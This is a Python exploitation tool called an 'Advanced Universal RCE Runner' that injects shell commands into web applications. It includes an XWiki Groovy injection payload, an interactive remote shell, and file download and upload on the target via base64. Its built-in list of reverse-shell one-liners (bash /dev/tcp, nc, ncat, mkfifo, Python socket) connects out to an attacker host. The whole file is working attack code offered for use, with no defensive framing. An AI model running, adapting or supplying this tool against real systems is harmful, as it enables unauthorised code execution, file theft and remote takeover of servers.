#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations
import argparse
import base64
import html
import os
import re
import sys
from dataclasses import dataclass
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, quote_plus

import requests
from requests.adapters import HTTPAdapter, Retry

@dataclass
class TargetConfig:
    base_url: str
    method: str
    path: str
    inject_param: Optional[str]
    params: Dict[str, str]
    data: Optional[str]
    headers: Dict[str, str]
    cookies: Dict[str, str]
    timeout: float
    verify: bool

@dataclass
class InjectConfig:
    template: str
    encode: str
    prefix: str = ""
    suffix: str = ""

@dataclass
class ExtractConfig:
    regex: Optional[str]
    unescape_html: bool

PRESETS = {
    "xwiki-groovy": "}}}{{async async=false}}{{groovy}}def p=['bash','-c','{cmd}'].execute(); print(p.text){{/groovy}}{{/async}}",
    "bash-c": "bash -lc \"{cmd}\"",
    "groovy-exec": "println(('bash -lc \"{cmd}\"').execute().text)",
}

REV_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
    "mkfifo": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
    "nc": "nc -e /bin/sh {host} {port}",
    "ncat": "ncat {host} {port} -e /bin/sh",
    "python": "python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"{host}\",{port})); [os.dup2(s.fileno(),i) for i in (0,1,2)]; pty.spawn(\"/bin/bash\")'",
}

def build_session(proxy: Optional[str], retries: int, backoff: float) -> requests.Session:
    sess = requests.Session()
    if proxy:
        sess.proxies.update({"http": proxy, "https": proxy})
    retry = Retry(total=retries, backoff_factor=backoff, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)
    return sess

def render_payload(template: str, cmd: str) -> str:
    return template.replace("{cmd}", cmd)

def encode_payload(payload: str, mode: str) -> str:
    if mode == "none":
        return payload
    if mode == "url":
        return quote_plus(payload)
    if mode == "b64":
        return base64.b64encode(payload.encode()).decode()
    raise ValueError("Unknown encode mode")

def send_injected(tc: TargetConfig, ic: InjectConfig, ec: ExtractConfig, sess: requests.Session, raw_cmd: str) -> Tuple[int, str, Optional[str]]:
    cmd = (ic.prefix + raw_cmd + ic.suffix).strip()
    injected = render_payload(ic.template, cmd)
    encoded = encode_payload(injected, ic.encode)
    url = urljoin(tc.base_url.rstrip("/") + "/", tc.path.lstrip("/"))
    params = dict(tc.params)
    data = tc.data
    if tc.inject_param:
        params[tc.inject_param] = encoded
    else:
        if data and "{payload}" in data:
            data = data.replace("{payload}", encoded)
        else:
            data = encoded
    resp = sess.request(tc.method.upper(), url, params=params, data=data,
                        headers=tc.headers, cookies=tc.cookies,
                        timeout=tc.timeout, verify=tc.verify)
    text = resp.text or ""
    if ec.unescape_html:
        text = html.unescape(text)
    extracted = None
    if ec.regex:
        m = re.search(ec.regex, text, re.DOTALL)
        if m:
            extracted = m.group(1).strip() if m.groups() else m.group(0).strip()
    return resp.status_code, text, extracted

def b64_read_cmd(path: str) -> str:
    return f"bash -lc 'test -r {shq(path)} && base64 -w0 {shq(path)}'"

def b64_write_cmd(path: str, b64data: str) -> str:
    return f"bash -lc 'echo {shq(b64data)} | base64 -d > {shq(path)}'"

def shq(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"

def interactive_loop(tc: TargetConfig, ic: InjectConfig, ec: ExtractConfig, sess: requests.Session):
    print("[i] Interactive mode. Type :help for commands, Ctrl+C to exit.")
    while True:
        try:
            cmd = input("rce> ").strip()
        except (EOFError, KeyboardInterrupt):
            print() 
            break
        if not cmd:
            continue
        if cmd.startswith(":"):
            if cmd in (":h", ":help"):
                print(
"""Commands:
  :help
  :pwd
  :whoami
  :ls [path]
  :rev host port
  :download <remote> [local]
  :upload <local>:<remote>
  :exit
"""
                )
                continue
            if cmd == ":exit":
                break
            if cmd == ":pwd":
                run_and_print(tc, ic, ec, sess, "pwd")
                continue
            if cmd == ":whoami":
                run_and_print(tc, ic, ec, sess, "whoami; id")
                continue
            if cmd.startswith(":ls"):
                arg = cmd.split(maxsplit=1)[1] if len(cmd.split())>1 else "."
                run_and_print(tc, ic, ec, sess, f"ls -lah {arg}")
                continue
            if cmd.startswith(":rev"):
                parts = cmd.split()
                if len(parts) != 3:
                    print("Usage: :rev <host> <port>")
                    continue
                host, port = parts[1], parts[2]
                for name, tmpl in REV_SHELLS.items():
                    print(f"[{name}] {tmpl.format(host=host, port=port)}")
                continue
            if cmd.startswith(":download"):
                parts = cmd.split()
                if len(parts) < 2:
                    print("Usage: :download <remote> [local]")
                    continue
                remote = parts[1]
                local = parts[2] if len(parts) > 2 else os.path.basename(remote)
                status, raw, extracted = send_injected(tc, ic, ec, sess, b64_read_cmd(remote))
                data_b64 = (extracted or "").strip()
                if not data_b64:
                    print(" Empty download or extraction failed.")
                    continue
                try:
                    data = base64.b64decode(data_b64)
                    with open(local, "wb") as f:
                        f.write(data)
                    print(f"[+] Saved to {local} ({len(data)} bytes)")
                except Exception as e:
                    print(f" Decode/save failed: {e}")
                continue
            if cmd.startswith(":upload"):
                parts = cmd.split()
                if len(parts) != 2 or ":" not in parts[1]:
                    print("Usage: :upload <local>:<remote>")
                    continue
                local, remote = parts[1].split(":",1)
                try:
                    blob = open(local, "rb").read()
                except Exception as e:
                    print(f" Read failed: {e}")
                    continue
                b64data = base64.b64encode(blob).decode()
                st_cmd = b64_write_cmd(remote, b64data)
                status, raw, extracted = send_injected(tc, ic, ec, sess, st_cmd)
                status, raw, extracted = send_injected(tc, ic, ec, sess, f"test -f {shq(remote)} && echo OK || echo FAIL")
                print(extracted or raw[:200])
                continue
            print(" Unknown command. :help for help")
            continue
        run_and_print(tc, ic, ec, sess, cmd)

def run_and_print(tc, ic, ec, sess, cmd: str):
    try:
        status, raw, extracted = send_injected(tc, ic, ec, sess, cmd)
        if extracted:
            print(extracted)
        else:
            print(raw[:1000])
    except Exception as e:
        print(f"[!] Request failed: {e}")

def parse_kv_pairs(items: list[str]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for it in items or []:
        if "=" in it:
            k, v = it.split("=", 1)
            out[k] = v
    return out

def main():
    ap = argparse.ArgumentParser(description="Advanced Universal RCE Runner")
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--path", required=True)
    ap.add_argument("--param", action="append", default=[])
    ap.add_argument("--inject-param")
    ap.add_argument("--data")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--cookie", action="append", default=[])
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--no-verify", action="store_true")
    ap.add_argument("--preset", choices=list(PRESETS.keys()), default="bash-c")
    ap.add_argument("--template")
    ap.add_argument("--encode", choices=["none","url","b64"], default="url")
    ap.add_argument("--prefix", default="")
    ap.add_argument("--suffix", default="")
    ap.add_argument("--extract-regex")
    ap.add_argument("--no-unescape", action="store_true")
    ap.add_argument("--proxy")
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--backoff", type=float, default=0.3)
    ap.add_argument("--cmd")
    ap.add_argument("--cmd-file")
    ap.add_argument("--shell", action="store_true")
    ap.add_argument("--download")
    ap.add_argument("--out")
    ap.add_argument("--upload")
    args = ap.parse_args()
    headers = parse_kv_pairs(args.header)
    cookies = parse_kv_pairs(args.cookie)
    params = parse_kv_pairs(args.param)
    tc = TargetConfig(
        base_url=args.base_url,
        method=args.method,
        path=args.path,
        inject_param=args.inject_param,
        params=params,
        data=args.data,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        verify=not args.no_verify,
    )
    template = args.template if args.template else PRESETS[args.preset]
    ic = InjectConfig(template=template, encode=args.encode, prefix=args.prefix, suffix=args.suffix)
    ec = ExtractConfig(regex=args.extract_regex, unescape_html=not args.no_unescape)
    sess = build_session(args.proxy, args.retries, args.backoff)
    if args.download:
        status, raw, extracted = send_injected(tc, ic, ec, sess, b64_read_cmd(args.download))
        payload = (extracted or "").strip()
        if not payload:
            print(" No data extracted. Check --extract-regex or target response.")
            sys.exit(1)
        blob = base64.b64decode(payload)
        if args.out:
            with open(args.out, "wb") as f:
                f.write(blob)
            print(f" Saved {len(blob)} bytes to {args.out}")
        else:
            sys.stdout.buffer.write(blob)
        return
    if args.upload:
        if ":" not in args.upload:
            print("--upload expects local:remote")
            sys.exit(1)
        local, remote = args.upload.split(":", 1)
        data = open(local, "rb").read()
        b64data = base64.b64encode(data).decode()
        status, raw, extracted = send_injected(tc, ic, ec, sess, b64_write_cmd(remote, b64data))
        status, raw, extracted = send_injected(tc, ic, ec, sess, f"test -f {shq(remote)} && echo OK || echo FAIL")
        print(extracted or raw[:200])
        return
    if args.shell:
        interactive_loop(tc, ic, ec, sess)
        return
    cmds = []
    if args.cmd:
        cmds.append(args.cmd)
    if args.cmd_file:
        with open(args.cmd_file, "r", encoding="utf-8", errors="ignore") as f:
            cmds += [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    if not cmds:
        print(" Provide --cmd, --cmd-file or --shell. See -h.")
        sys.exit(1)
    for c in cmds:
        status, raw, extracted = send_injected(tc, ic, ec, sess, c)
        if extracted:
            print(extracted)
        else:
            print(raw[:2000])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n!! Interrupted")
